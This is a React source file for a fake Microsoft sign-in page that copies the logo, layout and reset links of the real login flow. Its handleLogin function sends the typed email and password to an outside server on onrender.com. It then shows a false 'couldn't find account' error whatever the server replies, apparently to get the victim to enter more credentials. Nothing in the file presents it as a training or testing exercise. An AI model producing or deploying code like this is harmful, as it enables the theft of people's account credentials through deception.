import React, { useState } from "react";
import axios from "axios";
import micrologo from "../assets/micrologo.ico";
import { BsKey } from "react-icons/bs";
import { useNavigate } from "react-router-dom";

const MicrosoftSignIn = () => {
  const [step, setStep] = useState(1); // 1 = email step, 2 = password step
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [ message , setMessage ] = useState("")
    const navigate = useNavigate();
  const handleNext = (e) => {
    e.preventDefault();
    if (email.trim() !== "") {
      setStep(2);
    }
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    try {
      const res = await axios.post("https://demo-live.onrender.com/login", {
        email,
        password,
      });
      
      setMessage(`We couldn't find account with that username. Try another, or `)
      console.log("login successful", res.data);
    } catch (error) {
      console.log("login error", error.response?.data?.message);
    }
  };

  return (
    <section className="h-screen  bg-[linear-gradient(90deg,#f6e1dc_0%,#f2f5f7_50%,#e5efe5_100%)] flex justify-center items-center bg-gray-200">
      <section className="w-full max-w-[440px]">
        {/* Main card */}
        <div className="w-full  bg-white shadow-lg px-5 md:px-10 py-12">
          <section>
            {/* Logo */}
            <div className="flex items-center gap-1.5 mb-3">
              <img src={micrologo} alt="micrologo" className="w-[25px] h-[25px]" />
              <p className="font-semibold text-[1.2rem] text-gray-600">Microsoft</p>
            </div>

            {/* Step 1: Email */}
            {step === 1 && (
              <>
              
                <h1 className="font-semibold text-[1.5rem] pb-3">Sign in</h1>
                <form onSubmit={handleNext}>
                  <input
                    type="text"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="Email , phone or skype"
                    className="border-b border-gray-500 w-full py-2 outline-none focus:border-blue-500"
                  />
                  <p className="mt-3">
                    <a
                      href="https://passwordreset.microsoftonline.com/"
                      target="_blank"
                      className="text-[13px] text-blue-600"
                      rel="noreferrer"
                    >
                      Can’t access your account?
                    </a>
                  </p>
                  <div className="flex justify-end pt-8">
                    <button
                      type="submit"
                      className="text-white w-[100px] bg-[rgba(0,103,184,255)] py-1"
                    >
                      Next
                    </button>
                  </div>
                </form>
              </>
            )}

            {/* Step 2: Password */}
            {step === 2 && (
              <>
                <h1 className="font-semibold text-[1.5rem] pb-3">Enter password</h1>
                <p className="text-sm mb-3 text-gray-600">{email}</p>

                <p className="text-red-600">{message} <span className="text-blue-500"> <a href="https://signup.live.com/?lic=1"></a></span> </p>

                <form onSubmit={handleLogin}>
                  <input
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Password"
                    className="border-b border-gray-500 w-full py-2 outline-none focus:border-blue-500"
                  />
                  <p className="mt-3">
                    <a
                      href="https://passwordreset.microsoftonline.com/"
                      target="_blank"
                      className="text-[13px] text-blue-600"
                      rel="noreferrer"
                    >
                      Forgot password?
                    </a>
                  </p>
                  <div className="flex justify-between items-center pt-8">
                    <button
                      type="button"
                      onClick={() => setStep(1)}
                      className="text-[13px] text-blue-600 hover:underline"
                    >
                      ← Back
                    </button>
                    <button
                      type="submit"
                      className="text-white w-[100px] bg-[rgba(0,103,184,255)] py-1"
                    >
                      Sign in
                    </button>
                  </div>
                </form>
              </>
            )}
          </section>
        </div>

        {/* Sign-in options */}
        <div className="flex bg-white items-center mt-5 py-2.5 px-10 gap-3">
          <BsKey size={25} className="inline rotate-50 text-gray-600" />
          <p>Sign-in options</p>
        </div>
      </section>
    </section>
  );
};

export default MicrosoftSignIn;
